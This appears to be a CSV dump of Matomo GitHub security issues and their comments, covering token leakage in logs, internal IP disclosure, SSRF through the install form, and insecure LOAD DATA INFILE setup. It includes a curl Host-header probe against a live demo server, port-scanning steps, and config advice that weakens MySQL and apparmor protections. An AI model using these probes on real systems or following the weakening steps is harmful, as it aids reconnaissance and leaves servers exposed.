> 12.345.67.89 - - [31/Mar/2019:12:13:29 -0500] ""GET /matomo/piwik.php?idsite=1&rec=1&apiv=1&r=963767&cip=987.65.43.210&**token_auth=my_admin_token_auth**&_idts=1234094409&_idvc=0&_id=4a29e8bd0d739ec2&url=https%3A%2F%2Fwebsitename.com&urlref=&pv_id=714aa3&action_name=API+was+used HTTP/1.1"" 200 3312 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 HeadlessChrome/70.0.3538.77 Safari/537.36""

According to [Tracking HTTP API](https://developer.matomo.org/api-reference/tracking-api):

> To track page views, events, visits, you have to send a HTTP request (GET or POST) to your Tracking HTTP API endpoint, for example, http://your-piwik-domain.example/piwik.php with the correct query parameters set.

However, it's not clear how to send these via POST when using [PiwikTracker](https://developer.matomo.org/api-reference/PHP-Piwik-Tracker) (instead of CURL). I haven't dug into Matomo's code but shouldn't the PiwikTracker be using POST so the token_auth doesn't show up? Is there a way to force PiwikTracker to use POST? Here's some basic scrubbed code I'm using:

```
<?php
require_once('/matomo/libs/PiwikTracker/PiwikTracker.php');

\PiwikTracker::$URL = 'https:' . BASE_URL . 'matomo';
$piwikTracker = new \PiwikTracker(1, 'https:' . BASE_URL . 'matomo');

$token = $this->getMatomoTokenAuth();

if (isset($matomo['force_new_visit']) && $matomo['force_new_visit'])
{ $piwikTracker->setForceNewVisit(); }

if (isset($matomo['visitorId']) && $matomo['visitorId'])
{ $piwikTracker->setVisitorId($matomo['visitorId']); }

if (isset($matomo['user-agent']) && $matomo['user-agent'])
{ $piwikTracker->setUserAgent($matomo['user-agent']); }

$piwikTracker->setTokenAuth($token);
$piwikTracker->setUrl($matomo['url']);
$piwikTracker->setUrlReferer($global['HTTP_REFERER']);
$piwikTracker->setIp($global['ip_address']);

if ($username) { $piwikTracker->setUserId($username); }

$piwikTracker->doTrackPageView(urldecode($matomo['page_title']));
$visitorID = $piwikTracker->getVisitorId();
```I suggest you create an issue in the Matomo PHP Tracker for this: https://github.com/matomo-org/matomo-php-tracker/
For the archiving there is https://github.com/matomo-org/matomo/issues/14190",no,"Major,Task,c: Security,"
matomo-org/matomo,1195843013,"exposing user name of the generator of a report sent by email in the ""replying-to:"" field of the email","Matomo reports sent by email are exposing the username of the user generating the report through the ""reply-to:"" header field of the email. Though it's not a big issue, exposing the username which also serves as login name for this user should be considered as low security risk. 

## Expected Behavior
The email header of the report sent by email should not contain the ""reply-to:"" field at all, but if it does or has to for some reason, it should be configurable similar to `noreply_email_address` for the ""from:"" header field.

## Current Behavior
Sending a report by email, Matomo adds the ""reply-to:"" header field, looking like this: 
`reply-to: username <emailaddress@mydomain.com>
`

## Possible Solution
As there is no need to reply to a report sent, this header field is not necessary anyway. The simplest solution would be to just not add this header field when sending reports at all.
Alternatively: add options similar to `noreply_email_address` and `noreply_email_name` to configure what name and email address to add as ""reply-to:"" header.

## Context
Temporary workaround: Don't send reports from the admin account, but choose a user with as-low-as-possible rights to send reports. This way, the username is still exposed, but security risk is lower than with the admin account.

## Your Environment
* Matomo Version: 4.8.0
* PHP Version: 7.3.33
","This issue has been mentioned on **Matomo forums**. There might be relevant details there:

https://forum.matomo.org/t/changing-the-email-address-name-reports-are-being-sent-from/45420/6
I believe that's a regression, maybe we should add to the next milestone since there is a low-security risk.  I would recommend if there is no-reply header set, we hide part of the username. Like `ma***d`@peterhashair can you point at the PR you think this is a regression from?That shouldn't be a regression. This code exists since 2017:
https://github.com/matomo-org/matomo/blob/821734c769fb012fc2ee5994b56937988150bc0f/plugins/ScheduledReports/ScheduledReports.php#L368-L378",no,"c: Security,c: Privacy,"
matomo-org/matomo,812309633,"Use password_hash directly instead of password_hash(md5())","As discussed in https://github.com/matomo-org/matomo/issues/11962#issuecomment-782231136

At the moment Matomo stores passwords as password_hash(md5($user_password)). While this isn't a huge issue, this also isn't ideal.

To avoid this one could create a migration that adds some version string to this hash and then modifies the code to allow logging in with this modified old hash. In addition a new method could be created that uses password_hash directory (with some other version string). 
Finally every time a user logs in, the password hash could be migrated from the old to the new method using the users password directly. (quite similar to the current setup with password_needs_rehash)",,no,"c: Security,"
matomo-org/matomo,41989511,"List all sessions I'm currently signed in Piwik and let me signout","The goal of this issue is to add a single place to see everywhere youâ€™re signed in to Piwik and manage those sessions in your settings. 

Not sure if you remembered to log-out of your Piwik account on your friendâ€™s computer? This feature will have you covered. You will be able to go to your settings and click on `See where you are logged in` to see a complete list of the devices that you are logged into. You also can manage these sessions from this new page. If you see a session that you want to turn off, simply click on the sign out link.

This feature is available in Gmail, Google, Linkedin, and growing number of popular online tools. It really helps improve security.
","In which version of piwik should expect this plugin?
It's set in our `Mid term` milestone which can be about 1-3 years. If you need this faster please contact Piwik consulting: http://piwik.org/consulting/ Cheers
I have a plugin called LoginRevokable located at https://github.com/torosian/LoginRevokable that accomplishes most of what your looking for. Rather than displaying a list of authenticated devices, it remotely logs you out of all devices when you log out of one of them. So, forget to log out of a friends computer? Just log out piwik on your computer when you get home, and your session at your friends is invalidated also.

I activated the webhook before pushing tag 0.1.1, so it should be in the marketplace shortly.
It is now in the marketplace at http://plugins.piwik.org/LoginRevokable
Hi @torosian that's nice to see your plugin on the Marketplace! 
I haven't tested the plugin, but left a couple feedback in your issue tracker. 
",no,"Enhancement,c: Security,"
matomo-org/matomo,274183453,"Internal IP Exposure","This is in the latest version of Piwik 3.2.0

If you head to the HTTPS address, using the direct IP, and get the warning message about an untrusted hostname, then view the source of that page, the listing for piwik.piwik_url is the INTERNAL IP and not the EXTERNAL that you used to get there.  This should be fixed, itâ€™s a low risk, but the internal should never be exposed to the general public. The only work around we have right now is to disable this feature using enable_trusted_host_check=0  Viewing the source with it disabled, displays the correct external IP.
","Haven't had a closer look, but afaik it should output `$_SERVER['HTTP_HOST']` Report today:

Matomo discloses the server's internal IP address via the 'Location' header if you access /index.php/ with a non-default host header

For example:
curl -v -H 'Host: demo.matomo.org:123' https://demo.matomo.org/index.php/
...
< HTTP/1.1 302 Found
< Location: https://127.0.235.163/index.php

Internal IP disclosure poses no real risk on its own, but it makes exploiting other vulnerabilities like SSRF quite a lot easier. I do not expect a bounty for this.

",no,"c: Security,"
matomo-org/matomo,88863609,"sanitize tracking code displayed in the UI on output, not input","In TrackingCodeGenerator::generate(), `htmlentities()` is used (improperly) to escape HTML characters. The result is then outputted w/o escaping in _displayJavascriptCode.twig. Instead, TrackingCodeGenerator should return JS code w/o any additional processing/escaping, and it should be escaped only in HTML/XML output.

This is BC breaking since it affects API output. Users of that API currently will have to unsanitize or display the text w/o escaping, so it may break uses.

Refs #4231, #8109
","> This is BC breaking since it affects API output. User of that API currently will have to unsanitize or display the text w/o escaping, so it may break uses.

I'm not quite sure I understand. What exactly will break? Meaning what is the output before and after? Will people still be able to fetch the tracking code from the API and insert it automatically into the website? As it is 3.0.0 it is probably less important re BC but asking as there is already one issue merged. Hope we're not breaking API before :)
Right now, TrackingCodeGenerator will return already escaped output, which means SitesManager.getJavascriptTag will return escaped output, even if the format is JSON. After this issue is closed SitesManager.getJavascriptTag should return unescaped output for JSON results. If users are expecting escaped output, then their code may break.

There is no related BC break in 2.14.
Goals:
- Remove `|raw` filters
- First PR was created and needs to be reviewed:  #7997
",no,"c: Security,c: Platform,"
matomo-org/matomo,44433129,"New config setting to set autocomplete=off to password fields in Piwik","The goal of this issue is to create a new config file setting to enable `autocomplete=off` on all password fields in Piwik. 

Steps
- New config setting
- Applies to Login form, Password reset form, and other password field in Manage users admin screen 

Reasoning behind the request:

In february this year someone made the suggestion  in PR #231 and I decided to not put it in Piwik core as there seems to be a lot of people arguing against this measure as it breaks the usability of password managers. For more info on the pros/cons see: https://startpage.com/do/search?q=autocomplete%3Doff%20security 

However because some users like this setting and because it does provide better security in some cases  such as a Piwik accessible to dozens of people, then we should simply add such a useful setting.
","Is there any update on this features addition? That isn't anything we will work on soon. But Pull Requests are always welcome ðŸ™‚ Our security folks think we need to  set autocomplete=off. Currently we have to modify the matomo-installation after each update manually. We would really appreciate a config-setting for this.Hoenestly this doesn't matter anymore. Website developers have abused autocomplete=""off"" to break password managers so that most browsers started to side with the users and are ignoring it now. ",no,"Enhancement,c: Security,"
matomo-org/matomo,960088828,"Add .md files in the .htaccess file","## Summary
Some user ask:
```
To increase security and prevent from prying eyes I am deleting CHANGELOG.md once Matomo updates have been completed.
Why does Matomo run a File integrity check on CHANGELOG.md?
Why does Matomo need those *md files which easily reveal which Matomo version I am running?
```
I suggest to add *.md files or at least the `/CHANGELOG.md` file in the .htaccess file in order to increase (very little) the security...

## Your Environment
Ticket created from the forum: https://forum.matomo.org/t/why-does-matomo-run-a-file-integrity-check-on-changelog-md/42725","@heurteph-ei Thanks for picking up my question.Hi there. Thanks for your suggestion. Guess in general access to that file is not needed. So if possible you could simply restrict that server side. Matomo actually doesn't need that file to run, but afaik all files included in the release are included in the File Integrity check.Thanks. For now I am Redirecting requests using.

`RedirectMatch 404 \.md$`refs https://github.com/matomo-org/matomo-package/pull/126#issuecomment-807284191

Generally, if someone doesn't want such files accessible you can indeed redirect them or block access to it. ",no,"Enhancement,c: Security,"
matomo-org/matomo,216221725,"Installation user guide: improve security guidelines","### Suggestions below reported by email


Let me prefix this by saying that I have never installed your product.  In large part because of the issues below.
I am basing these security flaws on the current documentation on https://piwik.org/docs/installation/

1. Configuration is world-writable.

   As per the image in:
   https://piwik.org/wp-content/uploads/2008/11/2b-check-tofix1.png

   The configuration is created world-writable during the installation procedure.
   Either this is done by the software (unverified), or by the user following the instruction shown.

2. MySQL credentials are transmitted over unencrypted HTTP.

   There is no mention in the installation instructions of using encryption to safeguard credentials.
   There is no alternative method documented to configure the credentials (e.g. editing the configuration and uploading via scp).

3. Superuser credentials are transmitted over unencrypted HTTP.

   There is no mention of safeguarding these credentials either.

4. The phrase, ""by default the super user will be signed up for upgrade and security alerts"";

   There is no information about the privacy policy.
   There is also no mention of whether (or how, or which) user information will be submitted to Piwik when the option is not selected.

Thanks.",,no,"c: Security,"
matomo-org/matomo,140545084,"Enable MySQL Strict mode as best practise and security improvement","The goal of this issue is to enable MySQL strict mode in Piwik.
### Why enabling Strict mode?
- MySQL strict mode is a setting that implements a best practise around data management
- MySQL strict mode results in better security for Piwik users. Why? Currently as we are not using Strict mode, sometimes values with special unicode characters could be automatically truncated before being inserted. Why is data truncation a possible security issue? when values are truncated before being inserted in the DB, this can open up the application to certain vulnerabilities such as XSS, under special circumstances. For example see [this XSS in Wordpress](https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/)  (`tldr; mysql â†’ special characters â†’ truncation â†’ input validation â†’ output sanitisation â†’ xss â†’ time to update WordPress.`)

We would like to bring the best security practises to Piwik and strict mode would be a valuable security improvement.
### Requirements
- Currently, some plugin's dimensions (database table columns) are not NULLAble. Therefore when inserting a tracking request and if one of these not NULLable dimensions does not have a value, the INSERT in MySQL would fail in strict mode, causing data loss.
  - When we previously added `STRICT_TRANS_TABLES` in Piwik, this data loss made us revert the change. Reported in https://github.com/piwik/piwik/issues/8853 and fixed in https://github.com/piwik/piwik/pull/8930/files
- To prevent any data loss in Strict Mode, we need to modify all tracker dimensions in core and in all plugins (`log_*.*` columns) to be NULLable. Covered in #9231 (Make all log_\* tables fields NULLable to prevent errors ""Field 'X' doesn't have a default value""). 
  - Maybe we could also preset the dimension's value to non NULL value, when a dimension's value is not defined, to prevent strict mode from issuing a warning and discarding the INSERT?
- To make sure any data loss or warning during tracker is reported to Piwik users/admins, we need a stronger error reporting mechanism to communicate such issues automatically to Piwik administrators. Covered in  #7550 (How to detect any failure during Tracker requests and pro-actively inform Piwik admin of such error)

(also refs Require Mysql 5.5 #9107 and making utf8mb4 the collation by default #9785)
","+1",no,"c: Security,"
matomo-org/matomo,1299897071,"Allow moving all files apart from assets out of web root","this is a bit of a continuation of #8120

At the moment, Matomo can only be used by settings the web root to the directory all Matomo files are in. This means additional web server configuration and precisely crafted rules are required so that security-relevant files (especially tmp/ and config/) are not publicly accessible. But as web server configurations vary widely and as the recent ""private directories"" system check shows, there are a lot of people for who these configurations don't work (most commonly because `AllowOverride` is disabled (#17819) and therefore the .htaccess files created by Matomo do nothing). And the system check that tries to access the URLs that should be private makes some people aware of this, but often confuses people (#18693) or creates new issues (#18182, #17589, #18967, #19149) either because the failing requests trigger things like fail2ban or because it exposes broken cacert-setups.
And that is completely ignoring the question of people who don't use apache and then have to find out themselves that they need to block some file requests or their Matomo setup is insecure.

To get to the point: I feel like offering a Matomo install which works similar to this (and how most modern PHP/laravel applications work) would solve a lot of complexity which gaining a lot of security:
- Matomo would have a public/ directory
- People could use Matomo by setting their webroot to this directory
- public/index.php would be a simple script that imports the main index.php and probably fixes some path
- and probably a config.ini.php option that would enable this mode (as otherwise ""default"" users would have duplicate URLs)
- JS/CSS assets would work out of the box as they use index.php
- other assets would need to be copied to a corresponding subpath in public/ either implicitly (""copy some directory in every plugin"") or explicitly (""allow specifying a list of files that need to be public in the plugin description"")
- While I don't think large changes are needed, these changes still feel breaking enough for me that this would need to be part of Matomo 5

Also this would be an optional feature as there are still people who don't know what a web root is (even though a lot of PHP FOSS applications don't offer any other way to be used).

In summary, I think this would make it a lot harder for people to accidentally shoot themselves into the foot in regard to security (it's not like I haven't noticed in the past that I had some important Matomo files accidentally public), but it also has the disadvantage of offering ""one more way"" to install Matomo.
",,no,"Enhancement,c: Security,"
matomo-org/matomo,637436818,"how to make matomo.js tracker file not writable by the web server user for better security","Currently we recommend to make the matomo.js tracker file writable by the web server user, otherwise we display a warning in ""Diagnostics"": 

> The Matomo JavaScript tracker file ""/matomo.js"" & ""/piwik.js"" is not writable which means other plugins cannot extend the JavaScript tracker. In the future even some core features might not work as expected. We recommend to make ""/matomo.js"" & ""/piwik.js"" writable by running this command: 

As reported in https://github.com/matomo-org/matomo-package/issues/109 having core Matomo files as read-only would be a plus for security for some users. In particular, when the same server hosts other apps and one of these other apps gets attacked, then at least the attacker wouldn't be able to serve malicious JS via Matomo.

It can actually already be implemented by following these steps:
* make the file non writable by the webserver user (which will trigger the warning in diagnostics)
* but make the file writable by the crontab user
* setup a crontab to run every hour that will execute the command: `php path/to/matomo console custom-matomo-js:update` <- this crontab will re-generate the matomo.js tracker file when needed (for example after upgrading plugins that define a JS tracker file, or after installing a new plugin that has a tracker js file).

So maybe what we could do to eventually ""solve"" this issue would be to:
* Document this possible security enhancement in a FAQ and maybe mention it in https://matomo.org/docs/security/
* Update the logic in the diagnostic and do not issue a Warning, when the tracker JS file is not writable but was recently modified (eg. less than 2 hours ago) which would indicate that the steps above were implemented?
",,no,"c: Security,"
matomo-org/matomo,356164841,"Keep track of recognized user agents for more security","This feature would be akin to what facebook does.

* Matomo would keep track of logged in IPs & user agents.
* When a new, unknown IP/user agent logs in when there is another existing session, the existing session must approve the new device.
* In the admin area a user should be able to see the list of recognized devices and their last logins/login attempts.

This could also tie into a two factor auth feature, if a new device is used and there is no existing session, could require doing two factor auth for that login as an extra step.",,no,"c: Security,"
matomo-org/matomo,398729112,"ask Super Users to re-validate their email addresses if they attempt to sign in for the first time after a long break","To ensure Super Users are really the people they claim to be, when a Super User attempts to sign in for the first time after a long break (eg. one year?) then we ask the Super User to re-validate their email address by clicking on a link.

Idea from twitter: https://twitter.com/simonw/status/1084601178954944512

![sec](https://user-images.githubusercontent.com/466765/51094229-042b4a00-1810-11e9-96f8-ca6db778fc53.png)

","I could pick up and prepare PR for that issue. 

I was thinking about make two new settings in .ini config: boolean  `revalidate_superusers_password` to toggle the feature (default to `1`) and integer `revalidate_superusers_password_after` with default set to `365`. 

I see that there is already `last_seen` option that can be used for that but what about users that don't have `last_seen`? I see that could happen in two situations:
- if somebody never logged in: then we should look at registration time and re-validate e-mail address if it was `>= revalidate_superusers_password_after`.
- if someone updated Matomo from version that did not have `last_seen` saved: do you maybe know how long ago it was added? is is something I should worry about? if so, what to do?

What do you think about that approach?Wonder if we even need a setting or could just revalidate after 1 year or 6 months or so?Something to keep in mind though that makes this flow a bit buggy is that we don't validate an email address when adding an account. So the super user email may not actually exist and can therefore not be validated afterwards. It should be edge case though and we could just have an FAQ explaining how t o change the email address or so in the DB.",no,"c: Security,"
matomo-org/matomo,611600645,"Build UI for IP Whitelisting feature","It would be a security improvement if we could get our IP whitelisting feature configurable from the UI: https://matomo.org/faq/how-to/faq_25543/

To prevent people locking themselves out, we would maybe warn them if they're about to add an IP to the list that doesn't include their own IP address?",,no,"c: Security,c: Usability,"
matomo-org/matomo,308860387,"During installation, try to automatically force HTTPS, or invite users to setup SSL via Let's encrypt","The goal of this issue is to make sure most users will use Matomo over SSL all the time. Using SSL is very important and we need to remind users they should have it enabled by default.

### Context

 These days It is basically required to run Matomo over SSL for anyone using Matomo seriously. This will also help users achieve GDPR compliance #12600 as it's essential to use HTTPS for Matomo and GDPR compliance.

We are doing some work also in other issues:
* New system check to  #7279 Warn users if force_ssl is not yet enabled and in 
* #7366  Tracking code could use HTTPS when the Piwik server is configured to force SSL connections 

### Solution

Here the proposed solution is that during installation (maybe even in the very first screen?) we would display a new checkbox ""[x] Use HTTPS for secure data transfer with Matomo"" 

* if user is already using HTTPS, then auto-tick the box
* if user is using HTTP, we could maybe check and issue an HTTPS connection to check the index.php or the API replies correctly. If the HTTPS response is good, then we could also auto-tick the box.
* if the HTTPS check didn't pass, we could display a message ""Warning: please configure your Matomo instance so that connections succeed over HTTPS at https://example.com/ \n In case you do not yet ""
have a SSL certificate for your domain, we recommend to use (or ask your technical team) [Let's encrypt](https://letsencrypt.org/) to generate free SSL certificates"".

initially suggested by @sgiehl in https://github.com/matomo-org/matomo/issues/7279#issuecomment-75618484
",,no,"c: Security,c: Privacy,"
matomo-org/matomo,1257528620,"Move Annotations into their own dedicated table","### Move Annotations into their own table

At the moment annotations are saved in the `Option` table into a single row per site (see  `\Piwik\Plugins\Annotations\AnnotationList::save`). This approach seems to cause DB performance problems when annotations are added in bulk due to constant serialization and locks for updating on a single row.

An approach to cleanly solve this problem would be to create a dedicated DB table for the annotations rather than the single row serialization. This would require a new model/schema and a migration of the current data, but would be a good way to future proof and solve this performance problem.

## Your Environment
* Matomo Version: 4.10.1
* PHP Version: 8
* Server Operating System: Mac
* Additionally installed plugins:
","I will move this to the For Prioritization queue. It is a pretty important issue to keep Cloud performant also.Would it be possible to add it as a report in itself too? So that we could export it afterwards? For example as an email report.@Chardonneaur In theory the would be possible. For that we need API methods to fetch those annotations and a report class to provide that. But not sure if that will be handled in this issue.",no,"Major,Enhancement,c: Security,"
matomo-org/matomo,195683370,"Inconsistent use of cryptography - always try SSL first to connect to Piwik.org and other services","During security testing 3.0.0-rc3 I noted the following inconsistencies in the use of TLS that means someone with access to network traffic from client to servers (Piwik server or *.piwik.org) or from server to Internet could manipulate the content of pages within Piwik or executable modules, or exec within Piwik even if the end server uses TLS to protect all its page views.

1. Download link for 3.0.0-rc2 on Piwik blog https://piwik.org/blog/2016/12/piwik-3-release-candidate/ uses HTTP not HTTPS when linking to builds.piwik.org

Mitigate this by migrating the servers to HTTPS and use HSTS to keep users using HTTPS even if they encounter an HTTPS link, including builds.piwik.org.

Although all builds are PGP signed, you wouldn't known this unless you specifically go looking for that information, when you are directed to http://piwik.org/blog/2014/11/verify-signatures-piwik-packages/ this could also mitigate or defeat people attempting to impersonate the builds.piwik.org server.

2. Help information within in the app links to the Piwik site using HTTP when HTTPS is available. 

Mitigation - use HTTPS for these links.

Use of HSTS might reduce the window for attack without needing to change all links.

Some of this information also goes via the Proxy, but still opens pages over HTTP.

3. Feed burner information is loaded from

http://feeds.feedburner.com/Piwik

by the server to populate the Piwik Blog box by default.

plugins/RssWidget/Widgets/RssChangelog.php:            $rss = new RssRenderer('http://feeds.feedburner.com/PiwikReleases');
plugins/RssWidget/Widgets/RssPiwik.php:            $rss = new RssRenderer('http://feeds.feedburner.com/Piwik');

The HTTPS version of feedburner URLs are available, although there is some mixed content due to innocraft images loading over HTTP, these images aren't rendered in the RSS summary.

There doesn't appear to be any attempt to sanitise content in the RssRenderer, if the content could be relied on to be from a trusted source the current sanitisation may be sufficient, I didn't try manipulating or replacing feedburner responses, it can at least be exploited to lead users to the wrong website.

Testing of server HTTP use was incomplete, as we didn't start recording server HTTP activity before the installation was started. We noted other server initiated traffic over HTTP, but weren't able to confirm that Piwik was the source.","Noted in testing 3.0.4 that the request below still travels over HTTP, it also leaks pretty much everything (MYSQL version, PHP version, client IP address, timezone, server URL), and could be manipulated by attacker between server and Piwik server to prevent upgrades being applied, as well as identifying vulnerable servers.

I appreciate server to server HTTPS can be frustrating as many servers have such poor TLS settings out of the box (which is why WordPress does it itself, which isn't ideal either).

GET /1.0/getLatestVersion/?piwik_version=3.0.4&php_version=7.0.16&mysql_version=5.5.54&release_channel=latest_stable&url=http%3A%2F%2F10.66.2.85%2Findex.php&trigger=CoreHome&timezone=Europe%2FLondon HTTP/1.1
Host: api.piwik.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
X-Forwarded-For: 10.67.255.98
Via: 3.0.4  (Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0)
",no,"c: Website matomo.org,c: Security,"
matomo-org/matomo,624636804,"SSRF at DB setup due to lack of input validation","This issue corresponds to https://hackerone.com/reports/881345 by me.

**Description**
Matomo application while installation asks to create database setup which is handled by file at line https://github.com/matomo-org/matomo/blob/4afbe93a40334d31f2e0a71867277d183938f7a5/plugins/Installation/FormDatabaseSetup.php#L122 , which takes host as input from user. Host parameter has no input validation so instead of supplying a URI, attacker inserted a socket IP:Port. If the port is open, it will create a session.

Steps to Reproduce

1.  Download the matomo application from github and start the instalation.
2.  At Database setup page, insert IP:$port eg - 127.0.0.1:8080

For open ports, a connection will be established and for closed it will say connection refused. Please check the screenshot.

It is suggested to validate user input or create a separate field for port if it is meant to be a functionality.

**Impact**

If a person is authorized to install and maintain Matomo remotely and does not have access of the server on which Matomo is being installed, then an attacker can successfully do an internal port scan of the network and interact with other services running on other ports.
","In what way is this different to Wordpress, Nextcloud, Mediawiki, Moodle, etc. that all allow you to specify the MySQL host during the setup?

Can you also expand on how you would want to validate the user input? Any port and hostname could be a valid one (as one can install MySQL on any port), so any input by the user is valid.Hi @Findus23 
I am not aware of any other products mentioned, never worked on them, can't say about them.

Validation:
The page that allows user to set up database has a field **Host** which ideally should take host not a socket as I provided, to do so a regex pattern can be used for this field or Input character policies should be used and additionally a field **Port** can also be added, similar technique was used in CVE-2017-7272.
To perform a successful attack, I sent multiple requests to check the the open and closed ports --> adding rate limiting is also a good idea.
> 
> 
> In what way is this different to Wordpress, Nextcloud, Mediawiki, Moodle, etc. that all allow you to specify the MySQL host during the setup?
> 
> Can you also expand on how you would want to validate the user input? Any port and hostname could be a valid one (as one can install MySQL on any port), so any input by the user is valid.

Please look into it
",no,"c: Security,Waiting for user feedback,"
matomo-org/matomo,63897572,"LOAD DATA INFILE: Security issues in documentation and in general","I found some issues in the FAQ, which somehow disable security features to get MySQL's LOAD DATA INFILE to work:

```
Check that the sql user that Piwik is using has the permission to import the files: GRANT FILE on *.* to piwik@localhost
```

It should be

```
db.*
```

or even better

```
db.temptable
```

and not

```
*.* 
```

which would affect all databases (not only the piwik database).

```
give the process mysqld executable-access (+x) to files in path/to/piwik/tmp/assets/* and all parent folders.
```

Why would mysqld need to execute files in tmp/assets? Instead, read access to files should do, execution is only needed for directories.

```
check that the request isnâ€™t blocked by apparmor or any other security-software when accessing this folder. If you are using Ubuntu, you may have to disable apparmor which prevents mysql from accessing files in path/to/piwik/tmp/*
Edit the file /etc/apparmor.d/usr.sbin.mysqld and add the following path in the file: /path/to/piwik/tmp/assets/* rw,
Then restart apparmor with sudo /etc/init.d/apparmor restart
in your Mysql configuration (my.cnf) set the following options: [mysqld] local-infile and [mysql] local-infile
Then restart Mysql.
```

The local-infile would be system-wide, not only piwik-specific. In general, this opens up mysql. Plus, disabling apparmor is not an option for many users. Plus, why is writeable access proposed for mysqld (rw)?

```
If the LOAD DATA INFILE is still not working, try the following:
update to the latest PHP version or use the mysqli client (there are some known bugs with older PDO clients for mysql)
and/or switch the client to adapter=MYSQLI in the config/config.ini.php
and/or disable in your php configuration php.ini the options open_basedir and safe_mode. Restart webserver.
```

Switching to MYSQLI is not an option for everyone. Playing around with open_basedir and safe_mode does not have something to do with PDO/MYSQLI as the reader might assume when reading the text. Plus, open_basedir and safe_mode are important security features which should NOT be disabled just to fix some errors. Users should be taught about that. Plus: What does file read access in the context of mysql have to do with PHP's open_basedir/safe_mode settings? These settings will only affect how apache/PHP process behaves. MySQL is a separate process which will not respect these settings at all!

```
If you still cannot make LOAD DATA INFILE work, you can disable this feature completely. This is not recommended for medium to high traffic Piwik where this feature should be enabled. To disable LOAD DATA INFILE add to your config.ini.php file under [General] section: enable_load_data_infile=0
```

Yes, that's the best option for most users who would otherwise insecure their servers.

Documentation needs to be reviewed in terms of security (I just red the part I was writing about). Unexperienced users will insecure their systems otherwise.

And for the code: In general, I would suggest to not use LOAD DATA INFILE in the context of mysqld at all. For PostgreSQL there exists a set of PDO-functions allowing bulk inserts in the context of the PHP-client via file or STDIN. Check out https://bugs.php.net/bug.php?id=63656 . Eventually, there is also an option for MySQL, but I did not search for that right now. That's the way to go: No file access via the database process -> no hassle. And it's fast as hell on PostgreSQL, still allowing transactions by reusing the context of client's connection. I even found a way to reuse doctrine connections for that on PostgreSQL. If you are interested in that, read my comment on the mentioned php.net site (I feel sorry that you used MySQL...).

For users who don't use BULK INSERTs, please check out if a MySQL transaction is used around the whole dataset which is to be inserted. Plus, check out if the MySQL Multi Row syntax insert is used. Both measurements could massively improve performance.

If inserts are done via ORM (doctrine, etc.), please make sure that you use MySQL transactions (doctrine supports that) around the mass INSERTs. Within the transaction, you can flush multiple times using flush(array). Make sure you destroy objects between flushes, and make sure that only few entity objects are instantiated at any time. Having lots of objects instantiated heavily slows down doctrine performance.
","Hi @thomaszbz Thanks for the suggestion to improve the documentation about this feature.

since you seem knowledgeable about the security implications, maybe you would be able to paste here your suggested updated text for this FAQ? it would help us make this change faster. cheers 
As @thomaszbz explain on https://issues.piwik.org/7519 and @mattab commented about improving the documentation these where the steps I did on my Piwik installation just in case someone of you want to update https://piwik.org/faq/troubleshooting/#faq_194: 
-------------------
 How do I get LOAD DATA INFILE to work on my server?

Piwik processes huge amount of data and then stores this data in the database. For improved performance, Piwik tries to import a lot of data in the database at once using a Mysql feature called â€œLOAD DATA INFILEâ€. You can check whether your server supports this performance improvement in Administration > System Check menu. The system checks two commands: LOAD DATA INFILE and LOAD DATA LOCAL INFILE. Itâ€™s enough if either one of these work.

In order to do this, connect to your webserver with SSH. You'll need ROOT ACCESS OR ROOT PERMISSIONS.

    ssh root@your_webserver.com

First check that the sql user that Piwik is using has the permission to import the files: 

	mysql -u root -p 
	GRANT FILE on your_db_name.* to piwik@localhost;
	exit

Check the â€œmysqldâ€ process can access the file created in the tmp/assets directory in the piwik-installation: give the process mysqld read-access to files in path/to/piwik/tmp/assets/* and all parent folders.

	path/to/piwik/tmp/# chmod -R 755 assets/

check that the request isnâ€™t blocked by apparmor or any other security-software when accessing this folder. If you are using Ubuntu, you may have to disable apparmor which prevents mysql from accessing files in path/to/piwik/tmp/* Edit the file /etc/apparmor.d/usr.sbin.mysqld and add the following path in the file: 

	vim /etc/apparmor.d/usr.sbin.mysqld

		# Allow piwik access tmp files
		  path/to/piwik/tmp/assets/* rw,

Restart apparmor:

	sudo /etc/init.d/apparmor restart

in your Mysql configuration (my.cnf) set the following options: [mysqld] local-infile, secure-file-priv = """" and [mysql] local-infile

	vim /etc/mysql/my.cnf
		
		[mysqld]
		local-infile=1
		secure-file-priv = """"
		[mysql]
		local-infile=1

Restart mysql: 

	sudo service mysql restart

Now you can have that nice ""Huzzah! There are no problems with your Piwik setup. Give yourself a pat on the back."" message on Piwik's System Check page.  
@fortinux Nice catch. It's just that ordinary web space hosters won't let anyone change an apparmor profile. Now that the documentation already suggests to do exactly that, it should be documented that this step requires root access.Hi,

I just started out using Matomo and you should really rework this mentioned section in the help.
I am sorry to say, this is not offending, but it is as insecure and wrong as it could get.
You propose to set the FILE grant for the db user and then in the same section you propose to set the directory permissions and set local-infile. This absolutely makes no sense at all, either you use LOAD DATA INFILE : Then you need to grant a FILE permission to the user and make the directory accessible somehow, this is true. But then you don't need local_infile option at all. For what?
Or you use local_infile, then you absolutely don't need the other steps, no FILE grant and no directory permissions for mysqld process as LOAD DATA LOCAL does exactly not need that because it is read by the ""client"" which has access anyways and is ""uploaded"" to the server. I put this in """" because this also works if you are just working on localhost.
But as load_infile works only as a global setting like @thomaszbz mentioned this completely opens up your whole mysql install.
Users have a lot of problems to get LOAD DATA to work properly, but this is for sure not the optimal way. Most of them give up and just enable LOCAL, many without knowing the risks.
They should use either one of it not open up everything.
@thomaszbz sadly your suggestion to grant file on db.* makes no sense because this is even not possible. FILE is a global privilege and cannot be used on db level. You give the user all access for the server. That's it. If you have to use LOAD DATA you have to choose to open up directories that might be closed otherwise for 'mysql' user or use insecure LOAD DATA LOCAL.
This is not the best way to get it, especially for users that might have their install in /home/... directories, which is the case for many that use webpanel software. Won't get deeper into it in a public thread. 
But there would be really easy and far more secure ways to handle that. Really easy. Please consider that.

EDIT : 
as you can see in a previous comment @fortinux did exact that. He opened up both LOAD DATA possibility and then on top activated LOAD DATA LOCAL which makes the first things complete obsolete. This is not goodNothing seems to have happend for a very long time. What is the status here?",no,"Task,c: Security,"
matomo-org/matomo,394800919,"Homograph attack","Hello Kraken, I have found another interesting bug in the API key's list.

Bug:  Homograph attack.

